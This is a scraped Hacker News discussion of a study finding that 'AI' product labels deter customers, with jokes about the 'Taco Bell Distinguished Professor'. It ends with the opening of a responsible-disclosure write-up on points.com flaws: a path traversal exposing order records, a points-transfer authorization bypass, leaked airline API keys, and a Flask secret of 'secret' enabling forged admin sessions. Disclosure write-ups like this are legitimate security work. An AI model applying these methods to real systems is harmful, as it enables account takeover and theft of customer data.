https://www.tandfonline.com/doi/full/10.1080/19368623.2024.2... PDF: https://www.tandfonline.com/doi/epdf/10.1080/19368623.2024.2... reply pnt12 3 hours agoprevThis article is very forgiving towards tech companies, suggesting that users are techno phobic and the solution is to remove such labels. My perspective: consumers have seen new tech emerge a thousand times and are favoring reliability instead of the flavor of the month new tech, especially when it was designed to sell instead, not to solve real problems. This seems just like TVs, where more people long for dumber TVs with quality display - they are faster and more reliable than what the market of smart TVs is providing. reply photonthug 9 hours agoprevBrands increasingly seem to feel nothing but contempt for their customers, so I’m not sure they care. In so many areas customers have no real ability to choose anyway, so what else would commerce look like? There’s no reason to think brands want AI because their customers want it. reply bankcust08385 11 hours agoprevLet's play buzzword bingo, shall we?: Organic AI blockchain VR triple-play agile sticky growth-hacking methodology with an addressable market. Ubiquitous design and UX is better than throwing around nebulous technical cant 99.999% of people don't understand and are partially terrified of taking their jobs. While automating the navigation of ambiguous requests and delivering more open results with less exhaustive and tedious coding is cool, these features delivered to users have to provide useful advantages to be essential or they're just going to come off as \"me too\" bandwagon jumping. \"Self-hosted\", \"open architecture\", \"cloud optional\" are terms I like to see but only because I'm weirdo who tinkers with things sometimes but don't necessarily want to spend all of my time fixing or supporting fragile hacks. reply deely3 1 hour agoparentPlease add gamification to the list, and big data. reply candiddevmike 15 hours agoprevWish it would start turning off investors so we can see other kinds of innovation. reply vouaobrasil 6 hours agoprevAI drives me away because I don't want to support the automation of creative tasks. Even if the application isn't replacing creative people, I don't want to support any of it. To hell with AI! reply Jamustico 7 hours agoprevSame happen to crypto. I'm an huge crypto enthusiast, but whenever I see the term \"crypto\" being used somewhere I just cringe. reply sklargh 7 hours agoprevFor founders chasing enterprise deals, a small piece of advice. In the Fortune 500s LLM chat UIs provided a canvas to which lawyers, privacy and procurement people painted all of their nightmares. So slapping AI on your product might help a little with investors but it might also slow down your first enterprise deal by a year. reply vero2 12 hours agoprevAirports are a bellweather. This drives trends/investors/CEOs/middle managers. Living close to a large airport on a business city it was always - VMware - Azure - IBM etc Now-a-days - Get your employees co-pilot assisted Intel/Windows/etc to boost productivity reply mrmetanoia 13 hours agoprevThe advertisements for co-pilot during the Olympics were laughably bad. An attempt at the sentimental and way overplayed trope of people using search/apps interwoven with touching life moments. In this one though, it was all a bunch of sports related achievements they had to really stretch to tie back to co-pilot. Someone using it to make a chart tracking heart rate - like I'd put any health data in that thing. Then you have Google writing letters for your children or showing how their camera AI integrations can help you live a lie. Frankly I'm glad to see data showing consumers are turned off. Oh! And then for the executives they have Matthew McConaughey and Idris Elba talking about data security and productivity. reply badgersnake 11 hours agoparentI keep getting Intel ones with Molly Caudery, the pole vaulter who didn’t get over the bar once, explaining how AI helps her analyse her performance. It’s clearly working well for her. reply crowcroft 6 hours agoprevIt's not about whether AI signals if the quality is bad or good. It's that for most people they see 'AI' and they have no idea what that actually means. Sell benefits not features. reply bell-cot 6 hours agoparent> ...and they have no idea what that actually means. Subconsciously, many of them do \"know\" - it means that if you're an insecure and kinda clueless trend-chaser, then the 'AI' product is the one to buy. reply classified 6 hours agoparentprev> they see 'AI' and they have no idea what that actually means. To be fair, the providers don't know either. At the moment enough users are crazy enough to buy that as a feature. Let's see how long this will last. reply crowcroft 5 hours agorootparentPotentially true for earlier adopters, but we do live in a bubble with a lot more awareness for AI than most. My dad would struggle to tell you what the acronym AI would even stand for, but he's a pretty big spender on household technology like TVs, and audio gear. reply Tagbert 15 hours agoprevIt seems likely that if you can present a problem that customers have and a solution involving AI you’ll get a better response. It needs to be a real problem and the solution needs to be a better solution, though. reply atoav 12 hours agoprevThe thing is, I want a great product. Sometimes what I am looking for is a thing that involves LLMS, but most of the time what I hear is: telephones home and there is no way to stop it — and it probably doesn't even work half decent. Or the inclusion of the term AI is so ridiculous that you know nobody with reason works at that company. reply benreesman 6 hours agoprevThis is a golden age of machine learning in a lot of ways: Karpathy and others like him will teach you how to do magical things every bit as well as the most elite experts via YouTube, Lambda Labs and others will rent you the same kinds of clusters used by the most elite experts if not quite at brute force money furnace scale, Meta will give you the same code and weights they use in production, Huggingface has 10 trillion token datasets of the highest quality hosted, Anyscale and others have open sourced infrastructure that will empower staggering scale for even moderately well-resourced builders. This should represent a Cambrian Explosion of delightful innovation on par with anything that followed the emergence of the personal computer, or the web, or the smartphone. And there is in fact a ton of amazingly cool stuff happening under the tidal wave of shitty monetization and financialization. But the robber barons and the hustlers and the opportunists have gone for the jugular on how quickly and completely this event can be politicized (the lobbying and laws and the speed and ruthlessness around them are an embarrassment), how quickly it can be “monetized” via LLM spam and pump-and-dump Mag7 cap manipulation, and how directly it can be converted into a minimum cost offshore customer servicing model-style aspirations where consumers get a broken chat bot instead of a person while simultaneously facing pressure, real or perceived, that their job is about to be replaced by some inferior “agent” that isn’t done. Machine learning is an amazing technology that should be strictly delightful in the hands of people who live to build awesome things that make people happy and prosperous and safe. “AI” has come to mean LLM spam, Thiel/Altman-style TESCREAL fascist politics, a massive surge in ubiquitous digital surveillance (which somehow still had headroom), and the next turn of the crank on the enshitification of modern life courtesy of the Battery Club. The socially useful and technically exciting future of AI is just waiting on the fall of the “AI” people. It’s so close. reply stingraycharles 14 hours agoprevDepends on who your customers are. In B2B anything that mentions “AI” still sells like hot cakes, especially enterprises where the person who buys (ie signs the contract) isn’t the person who uses the product. We’re currently doing a bunch of “AI at the Edge” projects, even though it’s hardly justified (“edge” in this case is just an on-prem datacenter), but you need to use buzzwords like these to convince executives. reply BizarreByte 6 hours agoparent> but you need to use buzzwords like these to convince executives. And yet we’re told execs are smarter than the rest of us and deserve to make so much more than we do. Someday I pray the executive class gets its comeuppance. reply ImaCake 11 hours agoprevA conference I helped organise had a lot of “AI” and “LLM” submissions. We had a blanket rule of ignoring all of them since they mostly sucked anyway. Meanwhile another conference I am going to has several “machine learning” talks which could have been titled something more informative like “image analysis” or “regression modelling”. reply ChrisArchitect 13 hours agoprev[dupe] More discussion: https://news.ycombinator.com/item?id=41126685 reply TeeWEE 14 hours agoprev90% of AI companies are just thin layers on top of an LLM, sometimes useful but they have all the problems LLM have (I will explain) For existing companies with AI features: more useful but mostly LLM bolted on with the same use cases. They can improve the product if used right. But for me it’s mostly often just a gimmick. The problem with LLMs: They mostly generate stuff they have seen and are bad as truly new stuff. They make mistakes You need to put time and energy in the review it. For stuff that transforms data it’s useful. Like rewriting a piece of text. It’s also useful for search queries on the corpus the LLM is trained on. It’s good at pattern recognition and lastly: human like voice interfaces. But for generating novel stuff: good luck reviewing it. People who just blindly copy paste the output of an LLM: that’s quite dangerous and potentially plain wrong. At least that’s my experience. reply bane 14 hours agoparentThe fun bit is that the other 10% are just bog standard ML/DL models with the added benefit of being called \"AI\". reply imglorp 15 hours agoprevOnly some of the market is end users. The rest is businesses looking to replace headcount and they don't care what users think. reply samtho 15 hours agoparentThey are starting to care about it after catching on to out how overstated the real world capabilities of AI are to actually replace headcount. reply austin-cheney 10 hours agoprevAs a customer, and a developer, every time I see AI as a feature in product marketing I immediately think bullshit hype train. All other merchandising is ignored. If that’s all you have in your sales pitch then you are failing. reply emsign 6 hours agoprevWho would have thought. Don't believe the hype, especially if you have skin in the game. reply nottorp 11 hours agoprevBut isn't this a good thing? For the customers. It makes it easier for us to avoid hype based products and look for something that's actually useful to us... By all means, please use \"AI\" everywhere. reply bxguff 8 hours agoprevbecause they tacked it on! If the product is carefully considered tech built from the ground up using AI or ML Those products would not drive people away. Now things that worked like search on google and social media sites is so bloated and inconsistent that your grandma would notice while touting AI powered search. reply joduplessis 14 hours agoprevKinda hilarious seeing how hard people went to add \"AI\" to pretty much everything. reply idiocrat 8 hours agoprevBecause of the fAItigue the mentioning of AI will go away, but the orweillian precrAIme is here to stay. reply idiocrat 8 hours agoparentPrecrAIme © reply motbus3 12 hours agoprevMarketing people is trying to shovel AI in everything in the sense of AI as in video games not as in AI as in General AI. It's the same as the Smart products era. reply throw310822 10 hours agoprev> A study published in the Journal of Hospitality Marketing & Management Haha. So they made a splash talking about AI. Well played. reply hobs 6 hours agoprevThe simple truth is that for 99% of cases right now, you putting AI in your product means you are lazy. Your product team either has no idea or no control over your frothing execs. Your product will be outdated, replaced, or entirely canceled in 6-12 months and there's no reason I should build anything on top of it, or learn about it more. You are pretending to be a master of a technology your company barely understands and you give off big clown energy. reply goralph 9 hours agoprev> Journal of Hospitality Marketing & Management This seems more relevant to physical consumer goods I share the sentiment but I don’t think this is tech related. reply Simon_ORourke 12 hours agoprevWhat?! You mean that my company's half-baked quickly-on-the-bandwagon AI for AI's sake strategy might backfire? Shocking! Seriously though, it seems AI is being marketed towards investors, and that wherever it was included in a product it will be just to say it's on the product roadmap. If you're long enough in the game like myself you get to recognize these hype bubbles (CORBA anyone?) that claim to be about to take over the world and then fizzle out. reply n_ary 13 hours agoprevFor wiw, everything I used before on my Android now has an AI in it’s name(or screenshot) on PlayStore. So: * The AI Browser * AI note taking app * AI photo gallery * AI habit tracker * AI budget planner * AI music player * AI bank * AI hike planner * AI icon pack(wtf?!) * AI launcher * AI camera * AI news * AI PDF reader * AI comics viewer * AI Maps * AI food delivery * AI shopping experience * AI calorie tracker * AI video editor * AI backup * AI share * AI Authenticator(??) * AI partner * AI RoboAdviser(?) * AI Wallpapers * AI package tracker(?!) * AI health tracker And plenty other things I am forgetting. Even things that already had AI before are now new AI. This is getting out of hand. reply goatlover 7 hours agoparentThis is basically Ant-Man and the Wasp, \"Do you guys just put the word quantum in front of everything?\". reply CivBase 6 hours agoprevWhen I think of \"AI\" as a feature, I think * Nondeterministic * Untrustworthy * Uncertain * Marketing buzzword * Gimmick * Probably requires an external service or expensive hardware * Probably collecting my data If other people generally have the same perception, I'm not surprised it would drive people away. reply NotYourLawyer 6 hours agoprevAI = blockchain 2.0 reply olliej 13 hours agoprevThey should avoid actually deploying the massively invasive and power hungry anti-feature as well reply blotterfyi 13 hours agoprevI was recently at a non-AI security conference and was passing through a hallway. Heard the term AI like 10 times in 10 minutes. Everytime that happens, I go back to that meme that got created after Google's IO when Sundar Pichai said \"ai, ai, ai...\" like 113 times. reply seydor 14 hours agoprevNice try, competitors reply camillomiller 8 hours agoprevAs a journalist, I would really wish to see a study saying that headlines like the one CNN used on this article drive readers away. I hate the “this generic thing you have to discover by reading past the first paragraph” trend so much. reply hoseja 10 hours agoprev, journo terrified of AI says. reply broodbucket 10 hours agoparentI often thought most journalists were terrible and could be easily automated away, and having seen the rise of LLM-produced content, I am happy to say I was wrong and that we need more journalists reply senectus1 13 hours agoprevevery Wed I have a meeting with MS. I've started tallying every time co-pilot/AI/Chat-GPT is mentions. week before last its was 100 times in 34 mins, last week it was about 15 times. (not) looking forward to what this week will be. reply ulfw 6 hours agoprevAI has sadly become the new blockchain. Over hyped and consuming way to much power, attention and manpower for what it is with very little benefits to mankind. I guess that is what Tech is nowadays. So yes when I see 'AI' mentioned in products I shake my head before looking at details. Case in point: iOS 18.1 Beta. The Great Apple Intelligence. It does nothing. Just... you won't even notice it. reply nbzso 12 hours agoprevIt is nothing new. It is a nature of the economic models. We live in the bubble. The connection with reality is eroding progressively. You look at the information cycle you see opportunity, growth, futurism, promises, and social networks silos amplify what they find profitable. In reality: Economic instability, layoffs, wars, eroding of democracy everywhere, progressive government control, poverty, bad infrastructure, etc. Soon the reality will catch with tech bros and investors. Things are inflated to the brink. In this situation, AI marketing looks like a bad joke. ML is useful and applicable in a lot of use cases. But consumer AI fails time and time again to deliver the promised productivity boost and is expensive. So... reply azinman2 13 hours agoprev> said Dogan Gursoy, one of the study’s authors and the Taco Bell Distinguished Professor of hospitality business management at Washington State University The irony… I cannot imagine a more hilariously negative way to reduce a title than to say someone is the Taco Bell professor. reply Rinzler89 10 hours agoparent> I cannot imagine a more hilariously negative way to reduce a title than to say someone is the Taco Bell professor Reminds me of the scene from the movie Idiocracy where the main character's lawyer said he went to Costco Law School[1] and that he was lucky since his dad pulled some strings to get him in. [1] https://www.youtube.com/watch?v=sdNmOOq6T8Y reply autoexec 13 hours agoparentprevIt seems there's also a \"Coca Cola distinguished professor of marketing\" and a \"Yahoo! chair of information systems technology\" too. It's gross reply marginalia_nu 12 hours agorootparentWhile I imagine it just means they sponsored the academic institution, likely a good thing, but there's something unshakeably \"idiocracy\"-flavored dystopian about fast food product placement on professors. reply TeMPOraL 11 hours agorootparentIt turns from Idiocracy-flavored comedy-dystopian into bona fide dystopian rather quickly once you dig into what a multinational corporation does around and besides the product they're recognized for. \"Taco Bell Distinguished Professor of hospitality business management\" may sound funny, but if I ever heard about McDonald's Professor of Genetics, or Disney's Professor of Applied Robotics, I'd start getting worried. (In other words, \"Continuum\" vibes. An underrated Canadian sci-fi show featuring \"Corporate Congress\" and a bunch of luxury brands of today turning into serious industrial/energy/medical players under 50 years from now.) reply troupo 10 hours agorootparent> Disney's Professor of Applied Robotics Disney's robotics are legit though, they do a lot of work and research in that area reply Freak_NL 9 hours agorootparentI think they had a skunkworks spin-off out in a Connecticut suburb working on hyper-feminine, hyper-realistic androids at some point. reply TeMPOraL 9 hours agorootparentprevThat's precisely my point. Disney may still be mostly a kids' brand, but I bet their robotics department would hold its own if corporate decided to enter heavy industry or military robotics markets. The brand may seem like a joke, but the expertise isn't. reply sethammons 9 hours agorootparentI think the reply was to point out that people respect disney robotics. I bet more people know about disney robotics than boston dynamics. I think it is a \"you\"-thing thinking others also devalue disney because \"kid movies\" or some other property. There is no joke because people respect them already. Now, the fast food folks? That is silly. Unless it is about production efficiency from McDonalds. Or marketing by coke. Innovation and imagineering (cough, largely robotics) are synonymous with the image of disney. reply TeMPOraL 3 hours agorootparent> Innovation and imagineering (cough, largely robotics) are synonymous with the image of disney. Maybe it's' indeed a \"me\" problem, but I only vaguely know about \"imagineering\" thing via HN; it's not something I think I'd stumbled on otherwise. As far as I can tell, for most people I know, Disney is the kids programming producer that often makes stuff adults enjoy just as much, if not more, than kids, plus the company that took over Star Wars. A subset of them is also aware that the House of Mouse has a scary legal department. > There is no joke because people respect them already. Now, the fast food folks? That is silly. Unless it is about production efficiency from McDonalds. McDonald's must be a powerhouse in logistics and process engineering - and in case of the latter, it's not a big leap from making food to making drugs or advanced materials. I know a little bit about adjacent fields from the software side; the food processing plant and a chemical manufacturing plant use pretty much the same tools and processes. reply eclecticfrank 11 hours agorootparentprevA couple of years ago the University of Cape Town had a property called the \"Shell Environmental and Geographical Sciences Building\". But nowadays only the weathered shadows on the facade remain where the letters \"Shell\" once were mounted. reply marcus_holmes 10 hours agorootparentWestern Australia announced a \"Greentech Hub\" for environmental technology and innovation, sponsored by Chevron [0]. Chevron is, as you know, an enormous fossil fuel corp. The simplest and best method of improving the environment would be simply to shut down their oil and gas operations. The irony is almost overwhelming. As usual, nothing has been heard from the Greentech Hub since it was announced by the relevant minister almost a year ago. Which is fine, because the entire point of the thing was to have it announced by the relevant minister. It's all very Yes Minister / Utopia, and we all see straight through it. [0] https://startupnews.com.au/news/minister-dawson-announces-ne... reply cko 9 hours agorootparent> Chevron is, as you know, an enormous fossil fuel corp. The simplest and best method of improving the environment would be simply to shut down their oil and gas operations. The catastrophic levels of human deaths resulting from food shortages and supply chain disruption (and basically everything supporting civilization) would surely lower global CO2 emissions! reply bohrbohra 10 hours agorootparentprev> Chevron is, as you know, an enormous fossil fuel corp. The simplest and best method of improving the environment would be simply to shut down their oil and gas operations. The irony is almost overwhelming. Yea, but that would just make some other player take their place. The game-theoretic choice seems to be to keep doing what they are doing, while allocating some of that dirty money towards research in green tech. reply idle_zealot 10 hours agorootparentPresumably one would shut them down by making their cost externalizations illegal, not by specifically dismantling the single company. reply slater- 9 hours agorootparentprevOk but what if I said: we shouldn't arrest cartel hitmen, because that would just make some other murderer take their place. The game-theoretic choice seems to be to keep doing what they are doing, while allocating some of that dirty money towards research in nonviolent conflict management? reply toyg 8 hours agorootparentBelieve it or not, law enforcement agencies actually do that, more or less every day, in every country. There is value in having crime organised, predictable, somewhat circumscribed, and controlled by people you can communicate with and influence to a degree. Real life is rarely binary. reply teractiveodular 9 hours agorootparentprevI think you meant \"towards marketing claiming green tech\". reply brabel 10 hours agorootparentprevAnd to think Australia was basically the first major country to try to introduce a carbon tax back in the Julia Gillard days. Now, it looks more like the last major country still resisting any change, no matter how small, to the oil-fueled economy, by spinning words and actions to the extreme in order to look \"green\" while splurging in oil like Texans gushers in the early 1900's. reply naveen99 9 hours agorootparentprevAren’t fossil fuels from plants and good for plant life ? I mean plants breath in co2 and out o2. Higher co2 levels could probably turn deserts green. reply spaceman_2020 9 hours agorootparentprevCoca-Cola Professor of Marketing seems fitting though - Coca-Cola is probably one of the most capable marketing organizations the planet has ever seen. reply bb88 12 hours agorootparentprevIn sports this happens all the time. I guess it was only a matter of time before it hit education and professors. Ex. The Poulan/Weedeater Independence Bowl Guaranteed Rate Field Smoothie King Center And my fav: Bargain Booze Stadium reply pacifika 11 hours agorootparentThese are all things not people reply TeMPOraL 11 hours agorootparentSports teams are named by and/or owned by brands too. reply bb88 1 hour agorootparentEntire leagues as well. The Barclay Card English Premier League comes to mind. reply goatlover 10 hours agorootparentprevAnd that brand naming also sounds terrible. Candlestick Park or Comesky Park is a way better name than Levi's Stadium or Gauranteed Rate Field, for eff's sake. reply bilalq 11 hours agorootparentprevThere was a post a TechCrunch article posted here a couple of months ago referring to the Panasonic Professor of Robotics Emeritus at MIT. This probably happens in other fields too, but every time I've seen one of these brand-deal titles has been in an AI related article. reply TulliusCicero 12 hours agoparentprevIt really does read like a line from Idiocracy. reply minkles 11 hours agorootparentI can imagine the silk gowns being covered in brand logos. reply zorked 12 hours agoparentprevThe ridiculousness lies entirely on the US having sponsored professors. reply bee_rider 12 hours agorootparentHistorically lots of academics were sponsored by the nobility, right? Say what you will about Taco Bell, I’ll take their sponsorship over a bunch of pretentious thugs and hereditary gangsters. reply pxc 10 hours agorootparent> pretentious thugs Consider: the 1954 coup in Guatemala, the Coca-Cola death squads, Nestle's reliance on slave labor for cocoa (through a scheme of indirection that is common among other companies), etc. There's plenty of thuggery in the dealings of megacorps, and plenty of pretension in the sponsorship of a professorship by such a corporation reply pacifika 11 hours agorootparentprevGoing out on a limb and say that’s not a majority opinion. reply bee_rider 5 hours agorootparentPossibly, people romanticize the gangsters of the last century already, and they don’t even have the benefit of a thousand years of propaganda. reply l5870uoo9y 11 hours agorootparentprevHe just happens to prefer Taco shaped diagrams. reply klntsky 11 hours agorootparentprevTaco Bell is not nobility. Nobility = warriors reply TomWhitwell 11 hours agorootparent1000 years of English aristocracy disagrees: nobility = landowners reply defrost 11 hours agorootparentNot an especially precise or traditional equality. Most, but not all, noble and titled aristocracy had a landowner in the family, young aristocrats with older siblings would rarely inherit the land titles. On the flip, relatively few of the landowners were part of the nobility. Many of the grand landowners were, of course, but certainly once the merchant class started earning serious coin and commissioning all the best gardens on large estate they purchased from poor nobles, well, that relationship started to fall away. reply bee_rider 1 hour agorootparentprevThe English aristocracy might have disagreed 1000 years ago, but nobody cares what they thought because the French (Normans, mostly) would shortly prune those noble family trees quite aggressively. reply snakeyjake 12 hours agorootparentprevEndowed professorships are common globally. They have been common for at least 1,000 years. Much much longer than that but \"a millennium\" is enough to get my point across. Sometimes it seems as though half of the biomedical professorships in Europe are funded by Merck and Roche. Every single philosopher at Plato's Academy and the Lyceum was \"sponsored\" by wealthy merchants and politicians, the corporations and billionaires of that era. reply sebtron 12 hours agorootparentCan you give any example of an academic title being defaced by an ad placement? I doubt there was any \"Zorba's Olive Oil Philosopher\" in Plato's Academy. reply snakeyjake 5 hours agorootparentRoche-Professor für Infektionsimmunologie at Basel. Credit Suisse Asset Management (Schweiz) AG-Professur für Distributed Ledger Technology/Fintech Cambridge had a BP Professor of Chemistry until 2019 when BP stopped paying. Their price list is online: https://www.philanthropy.cam.ac.uk/give-to-cambridge/endowin... Are three examples sufficient? Taco Bell is a more ethical and apt supporter of higher education than BP, Credit Suisse, or Roche, lol. reply dialup_sounds 8 hours agorootparentprevUC San Diego was the first convenient list of endowed positions I found, but it's hardly unique: ASML Endowed Chair in Advanced Optical Technologies Callaway Golf Chair in Structural Mechanics Chugai Pharmaceutical Chair in Cancer Ericsson Chair in Wireless Communications Access Techniques Qualcomm Endowed Chair in Embedded Microsystems Etc, etc. reply lazide 10 hours agorootparentprevThat’s only because you don’t recognize the old brand names/people, not because the phenomenon is new. reply account42 10 hours agorootparentSo you can't give an example then? reply snakeyjake 5 hours agorootparentRoche-Professor für Infektionsimmunologie reply lazide 7 hours agorootparentprevAh, HN rate limiting. A classic example would be folks sponsored by the Medici’s or their numerous competitors. Or, for example, the numerous (often controversial) concessions Michelangelo had to make for the church. Which frankly, come across a bit like the Simpsons poking fun at Fox all the time. Albeit, more classically artistic of course. reply photonthug 9 hours agorootparentprevNo wonder Diogenes was looking for an honest man reply Yeul 9 hours agorootparentprevConsidering most European countries have universal healthcare the pharmaceutical industry is just an arm of the government. reply pjc50 9 hours agorootparentThat's not how any of this works. Even the UK, which does do direct provision, doesn't have state pharma manufacturing. Most European countries have a sort of hybrid approach of universal insurance but private regulated providers. Novo Nordisk is not part of the state of Denmark. reply kevin_thibedeau 13 hours agoparentprevIn the future, every university chair is sponsored by Taco Bell. reply another-dave 12 hours agorootparentAnd you get graded on a Bell curve reply arcanemachiner 10 hours agorootparentThe Doritos® Locos Taco curve. reply Findecanor 11 hours agorootparentprevExcept when they visit Europe for a conference, in which case it is Pizza Hut, because Taco Bell is not as well-established there. reply jajko 10 hours agorootparentWho eats there in Europe? Its mcdonalds of pizzas, the worst quality on the market, in this case a product that has little in common even in appearance with traditional pizza, more like hearthy focaccia. Less good, less healthy. Maybe good for late night drunks and stoners with nothing else still opened, but I know literally nobody who ever even mentioned eating there. reply Tainnor 10 hours agorootparent> the worst quality on the market not a big fan of Pizza Hut, but believe me: there's much worse. reply michaelt 9 hours agorootparentprev> Its mcdonalds of pizzas A massive commercial success, with tens of thousands of restaurants worldwide and hundreds of thousands of employees? reply jajko 5 hours agorootparentYeah, I know all this, but my question still stands - who apart from desperate with lack of other choice would ever decide to eat there? I get they end up with tons of customers, just that either people I know are ashamed of going there to even mention it (way more than mcdonalds) or I just don't know anybody who ever went there. Folks I know end up in MCDs all the time when partying, not much else open around midnight, even kebabs close at 10-10:30pm where I live. reply michaelt 4 hours agorootparentAt least in my area, Pizza Hut's target market is families. They're not trying to be the kind of posh place you'd go for an important business meeting, or with a date you wanted to impress. It's a bit more raucous - if your kids are a bit excitable they won't be spoiling the experience for the other diners. The food quality is fine - it's not haute cuisine but it's easy to make pizza taste great because it's packed with great tasting melted cheese and pepperoni and tomato sauce. If you don't know any people who go there it's probably because you don't know many people organising birthday parties for 13 year olds. reply garblegarble 10 hours agorootparentprevThey are referencing the 1993 movie Demolition Man reply chgs 11 hours agorootparentprevAnd every politician sponsored by Carls Junior reply ogou 10 hours agoparentprevThe academic path is tempting for many. The myth is that you get to spend all day in research and working with ideas. The truth is, a huge amount of time is spent writing grants and funding proposals. It's a whole industry and researchers and scientists at well-known institutions are expected to bring in a steady stream of funding, including funding their own positions. Historically that has been through foundations and government sources (which are massive). It's entirely unsurprising that brands have gotten involved. reply canjobear 9 hours agorootparentThe Taco Bell professorship is an endowed chair, not something you apply for. It’s paid for by Taco Bell as a gift to the university, then the university awards it as part of a recruitment (or retention) process for senior professors. It means the professor gets a nice salary and research stipend that is independent from the rest of the school, and can live the life of research and thinking. reply ogou 8 hours agorootparentIt is a different path through the same system. Your description is the exact language that Yum! Brands, Inc. is hoping people will use. It softens the crass branding of academic projects and positions the effort as altruistic. The American academic environment is filled with these obfuscations. reply canjobear 4 hours agorootparentWhat do you think is being obfuscated? It’s normal to give money so you can name stuff. reply layer8 12 hours agoparentprev\"Study authors should avoid the term 'Taco Bell'. It's turning off readers.\" I'm not sure if it's worse than 'AI distinguished professor' though. reply throw310822 10 hours agoparentprevA chair he holds since the Year of the Depend Adult Undergarment. reply cnity 10 hours agorootparentExcellent reference. reply fumeux_fume 12 hours agoparentprevPublish mas reply instagraham 9 hours agoparentprevImagine the family gatherings. \"How's our little distinguished Taco Bell professor?\" Jokes aside, one does not get to pick their academic sponsors or reject funding, and no offence intended to the guy's obvious expertise. It reminds me of the 100 Thieves Totino's Fortnite training room. reply ein0p 11 hours agoparentprevExtra ironic that Costco HQ is in WA as well. Feels like we’re one step away from Costco University where distinguished Taco Bell professors would dole out their wisdom about AI. reply safety1st 11 hours agoparentprevI mean it worked. Read this comment, was hungry, decided to order some tacos. Didn't even have to click the link. lol Also Taco Bell Distinguished Professor at.. WSU. yup that tracks reply throwup238 12 hours agoparentprevWait until you see the cross promotion: the Dogan Super QuesadillAI. reply justinclift 13 hours agoparentprevIn Australia we have a saying like \"they got their driving license in a Wheaties packet\". Wheaties being a breakfast cereal: https://en.wikipedia.org/wiki/Wheaties It's not a compliment. ;) So a \"Taco Bell professor\" sounds like a similar kind of thing, except it's real. reply layer8 12 hours agorootparent\"Distinguished\" makes the difference. ;) reply 8 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "A study reveals that labeling products as “AI” can deter customers due to associations with unreliability, complexity, and unnecessary features.",
      "Companies replacing effective search functions with AI chatbots have caused user frustration, highlighting a preference for simpler, more reliable solutions.",
      "The trend of adding AI to products is often driven by investor interest rather than consumer demand, leading to features perceived as gimmicks rather than genuine improvements."
    ],
    "points": 324,
    "commentCount": 291,
    "retryCount": 0,
    "time": 1723517639
  },
  {
    "id": 41232446,
    "title": "Hacking the largest airline and hotel rewards platform (2023)",
    "originLink": "https://samcurry.net/points-com",
    "originBody": "‹ Back Leaked Secrets and Unlimited Miles: Hacking the Largest Airline and Hotel Rewards Platform Thu Aug 03 2023 Introduction Between March 2023 and May 2023, we identified multiple security vulnerabilities within points.com, the backend provider for a significant portion of airline and hotel rewards programs. These vulnerabilities would have enabled an attacker to access sensitive customer account information, including names, billing addresses, redacted credit card details, emails, phone numbers, and transaction records. Moreover, the attacker could exploit these vulnerabilities to perform actions such as transferring points from customer accounts and gaining unauthorized access to a global administrator website. This unauthorized access would grant the attacker full permissions to issue reward points, manage rewards programs, oversee customer accounts, and execute various administrative functions. Upon reporting these vulnerabilities, the points.com team responded very quickly, acknowledging each report within an hour. They promptly took affected websites offline to conduct thorough investigations and subsequently patched all identified issues. All vulnerabilities reported in this blog post have since been remediated. Collaborators Ian Carroll (https://twitter.com/iangcarroll) Shubham Shah (https://twitter.com/infosec_au) Sam Curry (https://twitter.com/samwcyo) High Level Overview The following is a high level overview of the reported vulnerabilities. For the technical write-ups, please scroll down to the \"Investigating Points.com\" section. Directory Traversal leads to Query Access to Points.com Customer Order Records (March 7, 2023) Our first report was an unauthenticated HTTP path traversal allowing access to an internal API which would've allowed an attacker to query entries from a set of 22 million order records. The data within the records included partial credit card numbers, home addresses, email addresses, phone numbers, reward points numbers, customer authorization tokens, and miscellaneous transaction details. This information could be queried through an API call that returned one-hundred results per HTTP request. By appending optional sorting parameters, an attacker could enumerate the data or query for specific information (e.g. searching a customer's name or email address). Ability to Transfer Rewards Points and Leak Customer Information using only Rewards Number and Surname (March 7, 2023) The second vulnerability we reported was an authorization bypass that would allow an attacker to transfer airline rewards points from other users by knowing only their surname and rewards points number (both of these fields were disclosed in our first vulnerability report) via an improperly configured API. An attacker could generate full account authorization tokens which would allow them to manage customer accounts, view order history, view billing information, view contact information, and transfer points from customers. For both of the initial reports, the team responded in under 10 minutes and immediately took the websites offline. The issues were quickly fixed and the websites were back online shortly thereafter. Leaked Tenant Credentials for Virgin Rewards Program allows Attacker to Sign API Requests on Behalf of Virgin (Add/Remove Rewards Points, Access Customer Accounts, Modify Rewards Program Settings, etc.) On May 2nd, 2023, we discovered an endpoint on a points.com-hosted Virgin rewards website that leaked the \"macID\" and \"macKey\" used by Virgin to authenticate to the core points.com API on behalf of the airline. The credentials could be used to fully authenticate as the airline to the \"lcp.points.com\" API by signing HTTP requests using the disclosed secret, allowing an attacker to call any of the API calls intended for the airline like modifying customer accounts, adding/removing points, or modifying settings related to the Virgin rewards program. The points.com team responded and fixed the issue within only an hour. New Method for Transferring Airline Miles and Accessing Customer Account and Order Information from United MileagePlus members (April 29th, 2023) On April 29th, 2023, we identified an additional fourth vulnerability affecting specifically United Airlines where an attacker could generate an authorization token for any user knowing only their rewards number and surname. Through this issue, an attacker could both transfer miles to themselves and authenticate as the member on multiple apps related to MileagePlus, potentially including the MileagePlus administrator panel. This issue disclosed the member's name, billing address, redacted credit card information, email, phone number, and past transactions on the account. After reporting the issue, the team responded in under 10 minutes and immediately took the website offline. The issue was quickly fixed and the website was back online shortly thereafter. Full Access to Global Points.com Administration Console and Loyalty Wallet Administration Panel via Weak Flask Session Secret (May 2nd, 2023) On May 2nd, 2023, we identified that the Flask session secret for the points.com global administration website used to manage all airline tenant and customer accounts was the word \"secret\". After discovering this vulnerability, we were able to resign our session cookies with full super administrator permissions. After resigning the cookie with roles that give full administrator permissions, we observed that we could access all core administration functionality on the website, including user lookup, manual bonuses, rewards points conversion modifications (e.g. setting the exchange rate between two programs where 1 point would give you 1 million points), and many more points.com administrative endpoints (e.g. managing promotions, branding, resetting loyalty program credentials, etc.). An attacker could abuse this access to revoke existing reward program credentials and temporarily take down airline rewards functionality. For our last vulnerability report, the team responded within an hour (even though we'd reported it at 3:30 AM CST) by taking the website offline and changing the secret. Investigating Points.com With the cost of air travel becoming so expensive recently, I've gotten more and more into the \"credit card churning\" community where you can try to gamify credit cards and purchases to save rewards points which can be converted into things like flights and hotels. From a hacker's perspective, it's super interesting seeing a system that stores a numeric value that's essentially one-step from being used as an actual currency. The more and more I used these systems, the more interested I became in figuring out how they worked and what systems actually powered the rewards points industry. I sent a message to Ian Carroll, someone who has a huge amount of experience hacking airlines who also runs an airline rewards booking website called 